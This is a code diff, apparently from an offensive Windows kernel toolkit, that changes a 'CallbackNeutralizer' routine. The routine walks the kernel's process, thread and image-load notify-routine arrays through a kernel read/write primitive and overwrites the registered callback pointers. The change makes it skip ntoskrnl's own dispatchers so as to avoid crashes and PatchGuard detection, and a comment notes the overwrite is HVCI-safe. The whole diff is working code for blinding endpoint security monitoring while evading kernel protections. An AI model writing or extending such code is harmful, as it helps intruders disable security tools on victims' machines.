@@ -142,11 +142,22 @@ impl CallbackKit for CallbackNeutralizer {
         for array in [NotifyArray::CreateProcess, NotifyArray::CreateThread, NotifyArray::LoadImage] {
             let base = self.array_kva(array)?;
             for i in 0..notify_routines::ARRAY_LEN {
-                // Skip slot[0]: nt! internal dispatcher. Modifying it causes
-                // system instability and is a PatchGuard detection vector.
-                if i == 0 {
-                    continue;
-                }
+                // Selective targeting: skip callback slots whose routine pointer
+                // falls inside the ntoskrnl image (nt! internal dispatchers —
+                // overwriting them causes system instability and PatchGuard
+                // detection).
+                //
+                // When `ntoskrnl_base` + `ntoskrnl_size` are resolved, use
+                // range-based filtering: skip any slot whose routine address
+                // falls in [ntoskrnl_base, ntoskrnl_base + ntoskrnl_size).
+                // This catches the slot-0 dispatcher AND any other nt! internal
+                // callbacks at any slot position.
+                //
+                // Fallback (both == 0): skip only slot[0], the known
+                // dispatcher position. This preserves backward compatibility
+                // when the bootstrap hasn't resolved ntoskrnl bounds.
+                let skip_ntoskrnl = self.runtime.ntoskrnl_base != 0
+                    && self.runtime.ntoskrnl_size != 0;
                 let slot_kva = base + i * 8;
                 let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
                 if !notify_routines::is_occupied(packed) {
@@ -162,6 +173,21 @@ impl CallbackKit for CallbackNeutralizer {
                 let routine = (routine & notify_routines::PTR_MASK) as usize;
                 if routine < 0xFFFF_8000_0000_0000 {
                     continue;
+                }
+                // Skip ntoskrnl internal dispatchers — overwriting them causes
+                // system instability and PatchGuard detection.
+                if skip_ntoskrnl {
+                    // Range-based: skip if routine falls inside the ntoskrnl image.
+                    if routine >= self.runtime.ntoskrnl_base
+                        && routine < self.runtime.ntoskrnl_base + self.runtime.ntoskrnl_size
+                    {
+                        continue;
+                    }
+                } else {
+                    // Fallback: skip only slot[0], the known dispatcher position.
+                    if i == 0 {
+                        continue;
+                    }
                 }
                 // DATA write: overwrite the routine pointer in the context block.
                 // HVCI-safe (non-paged pool data section, not code).
